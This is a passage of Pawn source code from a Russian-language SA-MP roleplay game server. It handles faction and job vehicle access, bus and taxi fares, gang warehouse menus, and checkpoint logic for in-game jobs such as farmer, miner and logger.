							else if(GetPVarInt(playerid, "RazgJob") == 2) {
                                SetPlayerCheckpoint(playerid, 789.1042,529.2069,12.0085,5.0);
							}
							else if(GetPVarInt(playerid, "RazgJob") == 3) {
                                SetPlayerCheckpoint(playerid, 2320.2922,1736.8392,1.7617,5.0);
							}
							else if(GetPVarInt(playerid, "RazgJob") == 4) {
                                SetPlayerCheckpoint(playerid, -877.1223,1137.7087,10.5293,5.0);
							}
							else {
								new metka = random(4);
								switch(metka)
								{
								    case 0: {
								        SetPlayerCheckpoint(playerid, 1786.4874,2268.5398,15.7698,5.0);
	       								SetPVarInt(playerid, "MetkaJob", 1);
									}
									case 1: {
								        SetPlayerCheckpoint(playerid, -2451.6064,660.0789,5.3688,5.0);
	       								SetPVarInt(playerid, "MetkaJob", 2);
									}
									case 2: {
								        SetPlayerCheckpoint(playerid, -2488.6279,622.1194,5.3688,5.0);
								       	SetPVarInt(playerid, "MetkaJob", 3);
									}
									case 3: {
								        SetPlayerCheckpoint(playerid, 2738.2620,-2274.9829,17.9269,5.0);
								        SetPVarInt(playerid, "MetkaJob", 4);
									}
								}
							}
							DeletePVar(playerid, "TruckerJobTime");
							DeletePVar(playerid, "TruckerJobTimeGoToCar");
							if(GetPVarInt(playerid, "TruckerJobFuel") == 1) {
								SendClientMessage(playerid, C_OSNOV, "Отправляйтесь на загрузку");
							}
							else {
								SendClientMessage(playerid, C_OSNOV, "Не забудьте забрать прицеп, в противном случае вы не сможете загрузиться");
							}
                        }
						else
						{
							SendClientMessage(playerid, COLOR_RED, "Вы не работаете дальнобойщиком!");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
					}
					if(vehicleid >= mechanic[0] && vehicleid <= mechanic[1])
					{
						if(PI[playerid][pJob] != JOB_MECHANIC)
						{
							SendClientMessage(playerid, C_RED, "Вы не автомеханик!");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
					}
					if(PI[playerid][MechanicCarID] == vehicleid)
					{
						    SetTimerEx("CheckRentCar",8000,0,"i",playerid);
							ShowPlayerDialog(playerid, D_JOB+66, 0, "{ffffff}Аренда", "{ffffff}Вы хотите арендовать данный транспорт?\n\nСтоимость: {33CCFF}200р", "Да", "Нет");
					}//армия
					for(new i = 0; i != sizeof armycar; i ++)
					{
						if(vehicleid == armycar[i] && (!IsAArmy(playerid) || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//ОПГ Тамбовское
					for(new i = 0; i != sizeof tambcar; i ++)
					{
						if(vehicleid == tambcar[i] && (!IsAGang (playerid) || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//Мэрия
					for(new i = 0; i != sizeof pravocar; i ++)
					{
						if(vehicleid == pravocar[i] && (!IsAMayor (playerid) || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					} //TEAM_RSM
					for(new i = 0; i != sizeof rmcar; i ++)
					{
						if(vehicleid == rmcar[i] && (!TEAM_RSM || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//сми
					for(new i = 0; i != sizeof ritmcar; i ++)
					{
						if(vehicleid == ritmcar[i] && (!IsANews (playerid) || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//ФЬР
					for(new i = 0; i != sizeof fbicar; i ++)
					{
						if(vehicleid == fbicar[i] && (!TEAM_FBI || PI[playerid][pRank] < 2))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//итальянская мафия
					for(new i = 0; i != sizeof tombcar; i ++)
					{
						if(vehicleid == tombcar[i] && (!TEAM_OPG1 || PI[playerid][pRank] < 2))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//гибдд
					for(new i = 0; i != sizeof gibddcar; i ++)
					{
						if(vehicleid == gibddcar[i] && (!IsACop (playerid) || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}//ППС
					for(new i = 0; i != sizeof podolcar; i ++)
					{
						if(vehicleid == podolcar[i] && (!IsACop (playerid) || PI[playerid][pRank] < 1))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}
					for(new i = 0; i != sizeof mediccar; i ++)
					{
						if(vehicleid == mediccar[i] && (!TEAM_BOLNICA || PI[playerid][pRank] < 2))
						{
				            SendClientMessage(playerid, COLOR_RED, "Данный автомобиль вам недоступен, либо ваш ранг слишком мал.");
							RemovePlayerFromVehicle(playerid);
							ClearAnimations(playerid);
						}
					}
					if(vehicleid >= taxicar[0] && vehicleid <= taxicar[22])
					{
						if(PI[playerid][pJob] != JOB_TAXI)
						{
							SendClientMessage(playerid, C_RED, "Вы не таксист!");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
						if(GetMoney(playerid) < 5000)
						{
							SendClientMessage(playerid, C_RED, "Вам нужно 5000р чтобы арендовать это такси");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
						if(PI[playerid][TaxiCarID] == vehicleid) { }
						else
						{
							SetTimerEx("CheckRentCar",8000,0,"i",playerid);
							ShowPlayerDialog(playerid, D_JOB+59, 0, "Аренда", "{ffffff}Вы хотите арендовать данное такси?\nСтоимость аренды: {33CCFF}5000р", "Да", "Нет");
						}
					}
					if(vehicleid == comb_car[0])
					{
						SendClientMessage(playerid, COLOR_RED, "Данное авто недоступно");
						RemovePlayerFromVehicle(playerid);
						return 1;
					}
					if(vehicleid >= buscar[0] && vehicleid <= buscar[1])
					{
						if(PI[playerid][pJob] != JOB_BUS)
						{
							SendClientMessage(playerid, C_RED, "Вы не работаете водителем маршрутки!");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
						if(GetPVarInt(playerid, "BusTime") > 0 && GetPVarInt(playerid, "PriceBus") > 0 && PI[playerid][BusCarID] == vehicleid)
						{
							new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus"), name[37], string[128];
							switch(type)
							{
								case 1: name = "Автовокзал-Лесопилка-Шахта-Автошкола", SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],5.0);
							}
							format(string, sizeof(string), "%s\n{FFFFFF}Стоимость проезда: {63BD4E}%iр", name, GetPVarInt(playerid, "PriceBus"));
							if(!IsValidDynamic3DTextLabel(BusText3D[playerid])) BusText3D[playerid] = CreateDynamic3DTextLabel(string, 0xffa500FF, 0.0, 0.0, 1.0, 20.0, INVALID_PLAYER_ID, vehicleid);
							DeletePVar(playerid, "BusTime");
						}
						if(GetMoney(playerid) < 200)
						{
							SendClientMessage(playerid, C_RED, "Вам нужно 200р чтобы арендовать эту маршрутку");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
						if(PI[playerid][BusCarID] == vehicleid) { }
						else
						{
							SetTimerEx("CheckRentCar",15000,0,"i",playerid);
							ShowPlayerDialog(playerid, D_JOB+58, 0, "Аренда", "{ffffff}Вы хотите арендовать данную маршрутку?\n\nСтоимость: {33CCFF}200р", "Да", "Нет");
						}
					}
					/*new arend_id = INVALID_PLAYER_ID;
			     	if(GetArendCarID(vehicleid, arend_id) != (-1))
					{
						if(arend_id == INVALID_PLAYER_ID || !IsPlayerConnected(arend_id))
						{
						    new rc = GetArendCarID(vehicleid);

						    STRING_GLOBAL[0] = EOS;
						    format(STRING_GLOBAL,sizeof(STRING_GLOBAL), "{FFFFFF}Транспорт для аренды!\n\n- Модель: {46ca00}%s{FFFFFF}\n- Стоимость: {46ca00}%iр{FFFFFF}\n\n{afafaf}Чтобы арендовать, нажмите `Аренда`", VehicleNames[GetVehicleModel(vehicleid)-400], ArendInfo[rc][aCost]);
							ShowPlayerDialog(playerid, D_JOB+23, DIALOG_STYLE_MSGBOX, "Аренда", STRING_GLOBAL, "Аренда", "Отмена");
						}
						else if(arend_id != playerid)
						{
						    SendClientMessage(playerid, C_RED, "Этот транспорт уже арендуют");
						    RemovePlayerFromVehicle(playerid);
						}
					}*/
					if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading])
					{
						ShowPlayerDialog(playerid, D_STOPLOAD, DIALOG_STYLE_MSGBOX, "Погрузка", "{FFFFFF}Вы хотите прекратить загрузку боеприпасов в автомобиль?", "Да", "Нет");
					}
				}
			}
		}
		case 3: //Игрок в машине, на месте пассажира - (можно писать PLAYER_STATE_PASSENGER)
		{
			new vehicleid = GetPlayerVehicleID(playerid);

			if(GetVehicleData(vehicleid, veh_driver_id) != INVALID_PLAYER_ID)
			{
				new i = GetVehicleData(vehicleid, veh_driver_id);

				if(!IsPlayerInVehicle(i, vehicleid))
					return 1;

				if(GetPVarInt(i, "PriceBus") > 0)
				{
					if(GetMoney(playerid) < GetPVarInt(i, "PriceBus"))
					{
						SendMess(playerid, MSG_NOT_MONEY);
						RemovePlayerFromVehicle(playerid);
					}
					else
					{
						GiveMoney(playerid, -GetPVarInt(i, "PriceBus"), "оплата проезда");

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы заплатили %iр за проезд водителю %s", GetPVarInt(i, "PriceBus"), GetName(i));
						SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

						PI[i][pPayCheck] += GetPVarInt(i, "PriceBus");

						STRING_GLOBAL[0] = EOS;
						format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Пассажир %s заплатил %iр за проезд", GetName(playerid), GetPVarInt(i, "PriceBus"));
						SendClientMessage(i, COLOR_BLUE, STRING_GLOBAL);

						new string[10];
						format(string, sizeof(string), "~r~-%iр",  GetPVarInt(i, "PriceBus"));
						GameTextForPlayer(playerid, string, 5000, 1);
						format(string, sizeof(string), "~b~+%iр", GetPVarInt(i, "PriceBus"));
						GameTextForPlayer(i, string, 5000, 1);

						MysqlUpdatePlayerInt(i, "paycheck", PI[i][pPayCheck]);
					}
				}
				if(GetPVarInt(i, "PriceTaxi") > 0)
				{
					if(GetMoney(playerid) < GetPVarInt(i, "PriceTaxi"))
					{
						SendMess(playerid, MSG_NOT_MONEY);
						RemovePlayerFromVehicle(playerid);
					}
					else
					{
						GiveMoney(playerid, -GetPVarInt(i, "PriceTaxi"), "оплата такси");

						PI[i][pPayCheck] += GetPVarInt(i, "PriceTaxi");

						SetPVarInt(i, "ClientID", playerid);

						MysqlUpdatePlayerInt(i, "paycheck", PI[i][pPayCheck]);
						SetPVarInt(playerid, "TimeTaxi", 30);
						SetPVarInt(playerid, "TaxiPrice",GetPVarInt(i, "PriceTaxi"));
						SetPVarInt(playerid, "PlayerTaxi", i);
						new string[15];
						format(string, sizeof(string), "~r~-%iр", GetPVarInt(i, "PriceTaxi"));
						GameTextForPlayer(playerid, string, 5000, 1);
						format(string, sizeof(string), "~b~+%iр", GetPVarInt(i, "PriceTaxi"));
						GameTextForPlayer(i, string, 5000, 1);
						SetPVarInt(i, "TaxiMoney", GetPVarInt(i, "TaxiMoney") + GetPVarInt(i, "PriceTaxi"));
					}
				}
			}

			/*foreach(new i: Player)
			{
				if(PlayerLogged[i] == false) continue;
				if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2)
				{
					if(GetPVarInt(i, "PriceBus") > 0)
					{
						if(GetMoney(playerid) < GetPVarInt(i, "PriceBus"))
						{
							SendMess(playerid, MSG_NOT_MONEY);
							RemovePlayerFromVehicle(playerid);
						}
						else
						{
							GiveMoney(playerid, -GetPVarInt(i, "PriceBus"));

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы заплатили %iр за проезд водителю %s", GetPVarInt(i, "PriceBus"), GetName(i));
							SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

							PI[i][pPayCheck] += GetPVarInt(i, "PriceBus");

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Пассажир %s заплатил %iр за проезд", GetName(playerid), GetPVarInt(i, "PriceBus"));
							SendClientMessage(i, COLOR_BLUE, STRING_GLOBAL);

							new string[10];
							format(string, sizeof(string), "~r~-%iр",  GetPVarInt(i, "PriceBus"));
							GameTextForPlayer(playerid, string, 5000, 1);
							format(string, sizeof(string), "~b~+%iр", GetPVarInt(i, "PriceBus"));
							GameTextForPlayer(i, string, 5000, 1);

							MysqlUpdatePlayerInt(i, "paycheck", PI[i][pPayCheck]);
						}
					}
					if(GetPVarInt(i, "PriceTaxi") > 0)
					{
						if(GetMoney(playerid) < GetPVarInt(i, "PriceTaxi"))
						{
							SendMess(playerid, MSG_NOT_MONEY);
							RemovePlayerFromVehicle(playerid);
						}
						else
						{
							GiveMoney(playerid, -GetPVarInt(i, "PriceTaxi"));

							PI[i][pPayCheck] += GetPVarInt(i, "PriceTaxi");
							MysqlUpdatePlayerInt(i, "paycheck", PI[i][pPayCheck]);
							SetPVarInt(playerid, "TimeTaxi", 30);
							SetPVarInt(playerid, "TaxiPrice",GetPVarInt(i, "PriceTaxi"));
							SetPVarInt(playerid, "PlayerTaxi", i);
							new string[15];
							format(string, sizeof(string), "~r~-%iр", GetPVarInt(i, "PriceTaxi"));
							GameTextForPlayer(playerid, string, 5000, 1);
							format(string, sizeof(string), "~b~+%iр", GetPVarInt(i, "PriceTaxi"));
							GameTextForPlayer(i, string, 5000, 1);
							SetPVarInt(i, "TaxiMoney", GetPVarInt(i, "TaxiMoney") + GetPVarInt(i, "PriceTaxi"));
						}
					}
				}
			}*/
		}
	case 4: //Игрок вышел из машины
		{
			BE_Play_Check[playerid] = false;
		}
	case 5: //Игрок сел в машину на место водителя
		{
		}
	case 6: //Игрок сел в машину на место пассажира
		{
		}
	case 7: //Игрок выбирает скин (можно писать PLAYER_STATE_WASTED)
		{
		}
	case 8: //Игрок возродился (можно писать PLAYER_STATE_SPAWNED)
		{
		}
	case 9: //Игрок наблюдает с помощью функции SPECTATING (можно писать PLAYER_STATE_SPECTATING)
		{
		}
	}
	return 1;
}
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	if(checkpointid == gunsklad[2])
	{
	    if(PI[playerid][pMember] == TEAM_RIFA)
	    {
	        if(PI[playerid][pMember] == 9 && b_Sklad{2}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей банды закрыт!");
    	   	ShowPlayerDialog(playerid, D_GANG, 2, "Склад банды", "\
			   {63BD4E}Положить патроны\n\
			   {63BD4E}Положить деньги\n\
			   {63BD4E}Положить наркотики\n\
			   {FFFFFF}Взять патроны\n\
			   Взять деньги\n\
			   Взять наркотики", "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == gunsklad[3])
	{
	    if(PI[playerid][pMember] == TEAM_OPGTEST2)
	    {
	        if(PI[playerid][pMember] == 10 && b_Sklad{3}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей банды закрыт!");
    	   	ShowPlayerDialog(playerid, D_GANG, 2, "Склад банды", "\
			   {63BD4E}Положить патроны\n\
			   {63BD4E}Положить деньги\n\
			   {63BD4E}Положить наркотики\n\
			   {FFFFFF}Взять патроны\n\
			   Взять деньги\n\
			   Взять наркотики", "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == gunsklad[4])
	{
	    if(PI[playerid][pMember] == TEAM_VAGOS)
	    {
	        if(PI[playerid][pMember] == 11 && b_Sklad{4}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей банды закрыт!");
    	   	ShowPlayerDialog(playerid, D_GANG, 2, "Склад банды", "{63BD4E}Положить патроны\n{63BD4E}Положить деньги\n{63BD4E}Положить наркотики\n{FFFFFF}Взять патроны\nВзять деньги\nВзять наркотики", "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == gunsklad[5])
	{
	    if(PI[playerid][pMember] == TEAM_OPG1)
	    {
	        if(PI[playerid][pMember] == 15 && b_Sklad{5}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей мафии закрыт!");
			ShowPlayerDialog(playerid, D_MAFIA, 2, "Склад мафии", "{63BD4E}Положить патроны\n{63BD4E}Положить деньги\n{63BD4E}Положить наркотики\n{FFFFFF}Взять патроны\nВзять деньги\nВзять наркотики", "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == gunsklad[6])// - Русская мафия
	{
	    if(PI[playerid][pMember] == TEAM_RSM)
	    {
	        if(PI[playerid][pMember] == 16 && b_Sklad{6}) return SendClientMessage(playerid, COLOR_GREY, "Доступ к складу вашей мафии закрыт!");
			ShowPlayerDialog(playerid, D_MAFIA, 2, "Склад мафии", "{63BD4E}Положить патроны\n{63BD4E}Положить деньги\n{63BD4E}Положить наркотики\n{FFFFFF}Взять патроны\nВзять деньги\nВзять наркотики", "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == sitsklad[0])
	{
	   	if(IsANews(playerid) && PI[playerid][pLeader])
	    {
 			new bank;
			if(PI[playerid][pMember] == TEAM_SMI) bank = FracBank[8];

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Ввод средств в банк организации\nВывод средств из банка организации\nВ банке организации: %iр", bank);
			ShowPlayerDialog(playerid, D_JOB+131, 2, "Банк", STRING_GLOBAL, "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == sitsklad[1])
	{
	    if(PI[playerid][pMember] == TEAM_MERIA && PI[playerid][pLeader])
	    {
			new bank;
			if(PI[playerid][pMember] == TEAM_MERIA) bank = FracBank[9];

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Ввод средств в банк организации\nВывод средств из банка организации\nВ банке организации: %iр", bank);
			ShowPlayerDialog(playerid, D_JOB+131, 2, "Банк", STRING_GLOBAL, "Принять", "Отмена");
		}
		return 1;
	}
	else if(checkpointid == armyammo)
	{
	    if(IsAArmy(playerid) || IsAGang(playerid))
		{
			StealMats(playerid);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы не можете пользоваться этим складом!");
	}
	return 1;
}

public OnPlayerLeaveDynamicCP(playerid, checkpointid) return 1;

stock UpdateWH()
{
	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Состояние склада:\n{FFFFFF}Уголь: {FFFF00}%d/1000000 {FFFFFF}кг\nДерево: {FFFF00}%d/1000000 {FFFFFF}кг\nОружие: {63BD4E}%d/500000 {FFFFFF}ед", gGunWorkWH[0], gGunWorkWH[1], gGunWorkWH[2]);
	UpdateDynamic3DTextLabelText(gGunWorkWHText[0], 0xFFFFFFFF, STRING_GLOBAL);
	return 1;
}
stock UpdateWood()
{
	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Состояние склада:\n{FFFFFF}Дерево: {FFFF00}%d/110000000", gGunWorkWH[1]);
	UpdateDynamic3DTextLabelText(gGunWorkWHText[1], 0xFFFFFFFF, STRING_GLOBAL);
	UpdateDynamic3DTextLabelText(gGunWorkWHText[2], 0xFFFFFFFF, STRING_GLOBAL);
	SaveWarehouse();
	return 1;
}
stock UpdateWood2()
{
	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Состояние склада:\n{FFFFFF}Дерево: {FFFF00}%d/1000000", Lessdrov);
	UpdateDynamic3DTextLabelText(LessdrovText[0], 0xFFFFFFFF, STRING_GLOBAL);
	SaveWarehouse();
	return 1;
}
stock UpdateMiner()
{
	STRING_GLOBAL[0] = '\0';
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Состояние склада:\n{FFFFFF}Металл: {FFFF00}%d/1000000", gGunWorkWH[0]);
	UpdateDynamic3DTextLabelText(gGunWorkMinerText[0], 0xFFFFFFFF, STRING_GLOBAL);
	UpdateDynamic3DTextLabelText(gGunWorkMinerText[1], 0xFFFFFFFF, STRING_GLOBAL);
	UpdateDynamic3DTextLabelText(gGunWorkMinerText[2], 0xFFFFFFFF, STRING_GLOBAL);
	return 1;
}
public OnPlayerEnterCheckpoint(playerid)
{
	//if(GetPVarInt(playerid, "PlayerPickTime") > gettime()) SKick(playerid, 2937);
	//else SetPVarInt(playerid, "PlayerPickTime", gettime()+1);

	if(PI[playerid][P_JOB] == JOB_GUN_COLLECTOR && GetPVarInt(playerid, "relate") == 1 && GetPlayerState(playerid) == 1)
	{
		RemovePlayerAttachedObject(playerid,3);
	    ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);
		pPressed[playerid] ++;

		gGunWorkWH[2] += 300; // изменяем количество оружия
		UpdateWH(); // обновим информацию о складе

		SetPVarInt(playerid, "relate", 0);

		new idx = random(sizeof coord_checkpoint_gun_collector);

		SetPlayerCheckpoint(playerid, coord_checkpoint_gun_collector[idx][0], coord_checkpoint_gun_collector[idx][1], coord_checkpoint_gun_collector[idx][2]-1.0, 2.0);

		return 1;
	}
	if(PI[playerid][P_JOB] == JOB_GUN_COLLECTOR && GetPVarInt(playerid, "relate") == 0 && GetPlayerState(playerid) == 1)
	{
		DisablePlayerCheckpoint(playerid);
     	RemovePlayerAttachedObject(playerid,3);
	    ClearAnimations(playerid);
        ApplyAnimation(playerid, "BUDDY", "buddy_reload", 4.1, 1, 1, 1, 1, 0);
        SetPlayerAttachedObject(playerid,3,355,14,0.401943,0.011442,0.010348,106.050292,330.509094,3.293162,1.000000,1.000000,1.000000);
		SetTimerEx("ExtractionPlayer", 7000, false, "i",playerid);
		return 1;
	}
	if(PI[playerid][P_JOB] == JOB_FARMER && GetPlayerSkin(playerid) == 159 && GetPVarInt(playerid, "relate") == 0 && GetPlayerState(playerid) == 1)
	{
	    TogglePlayerControllable(playerid, 0);
		ClearAnimations(playerid);
		ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,1,1,1,1,11000);
		DisablePlayerCheckpoint(playerid);
		SetTimerEx("ExtractionPlayer", 5000, false, "i",playerid);

		return 1;
	}
   	if(PI[playerid][P_JOB] == JOB_FARMER && GetPlayerSkin(playerid) == 159 && GetPVarInt(playerid, "relate") == 1 && GetPlayerState(playerid) == 1)
	{
		pPressed[playerid] ++;

		new fmt_query[124];

		if(IsPlayerAttachedObjectSlotUsed(playerid,2))
			RemovePlayerAttachedObject(playerid, 2);
        ClearAnimations(playerid);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы доставили {FF9900}%d штук {66CC33}сена.", pPressed[playerid]);
		SendClientMessage(playerid, COLOR_LIME, STRING_GLOBAL);

		g_ferm_info[F_PROFIT] += 27*pPressed[playerid];
		g_ferm_info[F_BANK] += 27*pPressed[playerid];
		g_ferm_info[F_AMBAR] += 10;

		if(g_player_skills[playerid][S_FERM_COUNT] >= 150)
		{
		    g_player_skills[playerid][S_FERM_LVL] ++;
		    SendClientMessage(playerid, COLOR_LIME, "Уровень вашего фермерства повышен {FF9900}(/jskill)");
		    g_player_skills[playerid][S_FERM_COUNT] = 0;

			format(fmt_query, sizeof fmt_query, "UPDATE accounts_skills SET ferm_lvl=%d, ferm_count=%d WHERE owner=%d", g_player_skills[playerid][S_FERM_LVL], g_player_skills[playerid][S_FERM_COUNT], PI[playerid][pID]);
			mysql_query(dbHandle, fmt_query);
		}
		else {
			g_player_skills[playerid][S_FERM_COUNT] ++;

			format(fmt_query, sizeof fmt_query, "UPDATE accounts_skills SET ferm_count=%d WHERE owner=%d", g_player_skills[playerid][S_FERM_COUNT], PI[playerid][pID]);
			mysql_query(dbHandle, fmt_query);
		}


		SetPVarInt(playerid, "relate", 0);

		DisablePlayerCheckpoint(playerid);

		new idx = random(sizeof coord_checkpoint_farmer);

		SetPlayerCheckpoint(playerid, coord_checkpoint_farmer[idx][0], coord_checkpoint_farmer[idx][1], coord_checkpoint_farmer[idx][2]-1.0, 2.0);

		UpdateFermLabel();

		return 1;
	}

	if(PI[playerid][P_JOB] == JOB_MINER && GetPlayerSkin(playerid) == 260 && GetPVarInt(playerid, "relate") == 1 && GetPlayerState(playerid) == 1)
	{
		new count = random(45);
		pPressed[playerid] += count;

		if(IsPlayerAttachedObjectSlotUsed(playerid,1))
			RemovePlayerAttachedObject(playerid, 1);

		if(IsPlayerAttachedObjectSlotUsed(playerid,2))
			RemovePlayerAttachedObject(playerid, 2);

		if(IsPlayerAttachedObjectSlotUsed(playerid,3))
			RemovePlayerAttachedObject(playerid, 3);

		SetPlayerAttachedObject(playerid, 1, 18634, 6, 0.075000,0.002999,0.154000, 98.399978,-69.600013,1.100000);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы доставили {FF9900}%d кг {66CC33}руды.", count);
		SendClientMessage(playerid, COLOR_LIME, STRING_GLOBAL);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Всего принесено: {FF9900}%d кг {0099FF}руды", pPressed[playerid]);
		SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

		gGunWorkWH[0] += count; // обновим количество древесины на складе
		UpdateMiner(); // обновляем информацию о складе

		new idx = random(4);
		SetPlayerCheckpoint(playerid, coord_checkpoint_miner[idx][0], coord_checkpoint_miner[idx][1], coord_checkpoint_miner[idx][2], 3.0);

		SetPVarInt(playerid, "relate", 0);

		return 1;
	}
	if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 3.0,907.0281,473.4711,12.0054))
	    {
            if(Lessdrov < 70) return SendClientMessage(playerid, COLOR_GREY, "На складе недостаточно дерева");
            GoDerevo[playerid] = 1;
			TogglePlayerControllable(playerid, 1);
			DisablePlayerCheckpoint(playerid);
			ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
			SetPlayerAttachedObject(playerid, 4, 1463, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 0.476124, 0.468181, 0.470769);
			new id = RandomEx(0,2);
			SetPlayerCheckpoint(playerid,RandomWood[id][0],RandomWood[id][1],RandomWood[id][2],2.0);
			return 0;
		}
	}
	if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD && IsPlayerInRangeOfPoint(playerid, 2.0, 828.1499,483.7570,12.0959) || IsPlayerInRangeOfPoint(playerid, 2.0, 835.8714,520.8663,12.0959) && GetPlayerState(playerid) == 1)
	{
		DisablePlayerCheckpoint(playerid);
	    RemovePlayerAttachedObject(playerid, 4);
		new randd = 15 + random(45);
	    pPressed[playerid] += randd;

		STRING_GLOBAL[0] = EOS;
	    format(STRING_GLOBAL,6,"%d кг",randd);
	    SetPlayerChatBubble(playerid,STRING_GLOBAL,COLOR_PURPLE,20.0,10000);
	    ClearAnimations(playerid);

		ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{d45901}Вы принесли {e0c600}%d кг {d45901}древесины.", randd);
		SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

		gGunWorkWH[1] += randd; // обновим количество древесины на складе
		Lessdrov -= randd;
		UpdateWood(); // обновляем информацию о складе
		UpdateWood2();

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{37c268}Всего принесено: {e0c600}%d кг {37c268}древесины", pPressed[playerid]);
		SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);
		SetPlayerCheckpoint(playerid,907.0281,473.4711,12.0054,2.0);
		return 1;
	}
	if(PI[playerid][P_JOB] == JOB_LOGGER && IsPlayerInRangeOfPoint(playerid, 2.0, 907.0281,473.4711,12.0054) && GetPlayerState(playerid) == 1)
	{
		GoDerevo[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
	    RemovePlayerAttachedObject(playerid, 4);
		new rand = 15 + random(45);
	    pPressed[playerid] += rand;

		STRING_GLOBAL[0] = EOS;
	    format(STRING_GLOBAL,6,"%d кг",rand);
	    SetPlayerChatBubble(playerid,STRING_GLOBAL,COLOR_PURPLE,20.0,10000);
	    ClearAnimations(playerid);

		ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,0,1);

	    DeletePVar(playerid, "Derevo");
	    SetPVarInt(playerid, "LessProgress", 0);
	    SetPVarInt(playerid, "LessStatus", 0);

